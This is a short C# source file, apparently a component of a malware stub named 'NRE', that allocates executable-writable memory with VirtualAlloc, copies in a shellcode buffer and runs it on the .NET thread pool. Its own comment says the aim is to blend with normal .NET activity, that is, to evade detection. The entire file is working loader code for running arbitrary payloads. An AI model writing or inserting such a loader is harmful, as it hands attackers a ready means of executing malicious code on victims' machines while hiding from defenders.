using System;
using System.Runtime.InteropServices;

namespace NRE.Stub.Execution
{
    /// <summary>
    /// Execute shellcode or work on the CLR thread pool to blend with normal .NET traffic.
    /// </summary>
    public static class Threadpool
    {
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        private delegate void ThreadStartDelegate();

        public static void QueueShellcode(byte[] shellcode)
        {
            if (shellcode == null || shellcode.Length == 0) return;
            IntPtr buf = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (buf == IntPtr.Zero) return;
            Marshal.Copy(shellcode, 0, buf, shellcode.Length);
            System.Threading.ThreadPool.QueueUserWorkItem(_ =>
            {
                var fn = (ThreadStartDelegate)Marshal.GetDelegateForFunctionPointer(buf, typeof(ThreadStartDelegate));
                fn();
            });
        }
    }
}
